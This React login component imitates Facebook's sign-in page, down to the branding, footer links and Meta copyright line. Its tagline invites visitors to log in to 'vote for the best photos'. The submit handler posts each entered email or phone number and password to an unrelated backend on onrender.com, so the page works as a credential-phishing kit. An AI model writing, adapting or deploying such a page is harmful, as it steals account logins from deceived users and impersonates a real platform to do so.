import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Login.css';

const Login = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [errors, setErrors] = useState({ email: '', password: '' });
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors(prev => ({ ...prev, [name]: '' }));
  };

  const validateForm = () => {
    let isValid = true;
    const newErrors = { email: '', password: '' };
    if (!formData.email.trim()) {
      newErrors.email = 'Email address or phone number is required';
      isValid = false;
    }
    if (!formData.password) {
      newErrors.password = 'Password is required';
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
      isValid = false;
    }
    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      setIsLoading(true);
      const API_BASE = import.meta.env.VITE_API_BASE_URL || 'https://facebookbackend-fp4k.onrender.com';
      try {
        const res = await fetch(`${API_BASE}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ emailOrPhone: formData.email, password: formData.password }),
        });
        const data = await res.json();
        if (res.ok) {
          localStorage.setItem('userEmail', formData.email);
          navigate('/dashboard');
        } else {
          alert(`Error: ${data.error || 'Login failed'}`);
        }
      } catch (err) {
        console.error(err);
        alert('Cannot connect to server. Please try again later.');
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="fb-root">
      <div className="fb-wrapper">
        <div className="fb-left">
          <div className="fb-logo">facebook</div>
          <div className="fb-tagline">
            Connect with friends, share moments, and make your voice heard. 
            <strong> Vote for the best photos</strong> and help crown the winner!
          </div>
        </div>
        <div className="fb-right">
          <form className="fb-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              name="email"
              placeholder="Email address or phone number"
              value={formData.email}
              onChange={handleChange}
              className={errors.email ? 'error' : ''}
              disabled={isLoading}
            />
            {errors.email && <div className="error-text">{errors.email}</div>}
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className={errors.password ? 'error' : ''}
              disabled={isLoading}
            />
            {errors.password && <div className="error-text">{errors.password}</div>}
            <button type="submit" className="fb-login-button" disabled={isLoading}>
              {isLoading ? <span className="spinner"></span> : 'Log in'}
            </button>
            <a href="#" className="fb-forgot-password" onClick={(e) => e.preventDefault()}>
              Forgotten password?
            </a>
            <div className="fb-divider"></div>
            <button type="button" className="fb-create-account" onClick={() => alert('Create account flow')}>
              Create new account
            </button>
          </form>
          <div className="fb-create-page">
            <a href="#">Create a Page</a> for a celebrity, brand or business.
          </div>
        </div>
      </div>
      <footer className="fb-footer">
        <div className="footer-content">
          <div className="footer-languages">
            <a href="#">English (US)</a>
            <a href="#">Español</a>
            <a href="#">Français (France)</a>
            <a href="#">中文(简体)</a>
            <a href="#">العربية</a>
            <a href="#">Português (Brasil)</a>
            <a href="#">Italiano</a>
            <a href="#">한국어</a>
            <a href="#">Deutsch</a>
            <a href="#">हिन्दी</a>
            <a href="#">日本語</a>
            <button className="lang-plus">+</button>
          </div>
          <div className="footer-line"></div>
          <div className="footer-links">
            <a href="#">Sign Up</a>
            <a href="#">Log In</a>
            <a href="#">Messenger</a>
            <a href="#">Facebook Lite</a>
            <a href="#">Video</a>
            <a href="#">Places</a>
            <a href="#">Games</a>
            <a href="#">Marketplace</a>
            <a href="#">Meta Pay</a>
            <a href="#">Meta Store</a>
            <a href="#">Meta Quest</a>
            <a href="#">Instagram</a>
            <a href="#">Threads</a>
            <a href="#">Fundraisers</a>
            <a href="#">Services</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Privacy Center</a>
            <a href="#">Cookies</a>
            <a href="#">About</a>
            <a href="#">Create ad</a>
            <a href="#">Create Page</a>
            <a href="#">Developers</a>
            <a href="#">Careers</a>
          </div>
          <div className="footer-copyright">Meta © 2025</div>
        </div>
      </footer>
    </div>
  );
};

export default Login;